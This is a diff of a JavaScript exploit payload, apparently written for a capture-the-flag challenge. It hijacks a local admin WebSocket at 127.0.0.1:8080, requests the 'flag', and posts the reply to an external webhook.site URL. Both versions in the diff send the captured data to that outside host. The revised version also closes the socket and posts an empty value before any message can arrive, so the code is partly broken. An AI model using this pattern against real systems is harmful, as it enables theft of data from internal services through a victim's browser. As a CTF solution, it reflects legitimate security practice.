@@ -13,41 +13,46 @@
         // WebSocket URL
         const websocketURL = "ws://127.0.0.1:8080/admin/ws";
 
-        // Webhook URL (without query parameter)
-        const webhookBaseURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";
+        // Webhook URL
+        const webhookURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";
 
         // Create a new WebSocket connection
         const socket = new WebSocket(websocketURL);
 
+        let flag = "";  // Declare a variable to store the received message
+
         // Open WebSocket connection and send "flag" when connected
-        socket.onopen = function(e) {
-            socket.send("increment");
-        };
+        socket.addEventListener("open", (event) => {
+            socket.send("flag");
+        });
 
-        socket.onmessage = function(event) {
-            const flag = event.data; // Capture the flag from the WebSocket message
-            sendPostToWebhook(flag); // Now send the POST request with the flag
-        };
+        // Handle message received from WebSocket
+        socket.onmessage = (event) => {
+            flag = event.data;  // Store the received message in the 'flag' variable
+            console.log("Received message:", flag);
 
-        socket.onclose = function(event) {
-            if (event.wasClean) {
-                alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
-            } else {
-                 sendPostToWebhook(flag);
-                alert('[close] Connection died');
-            }
-        };
+            // Send the POST request after the WebSocket message is received
+            sendPostToWebhook(flag);
 
-        // Function to send POST request to Webhook
+            // Close the WebSocket connection after receiving the message
+           
+        };
+         socket.close();
+        sendPostToWebhook(flag);
+
         function sendPostToWebhook(flag) {
             console.log("Sending POST request to Webhook");
 
-            // Create the URL with the query parameter
-            const webhookURLWithFlag = `${webhookBaseURL}/flag=${encodeURIComponent(flag)}`;
+            // Create the payload with the flag
+            const payload = { flag: flag };
 
-            // Send POST request to Webhook with the flag as part of the URL
-            return fetch(webhookURLWithFlag, {
-                method: "POST", // Use POST method
+            // Send POST request to Webhook with the flag
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)  // Send the flag in the payload
             })
             .then(response => {
                 if (response.ok) {
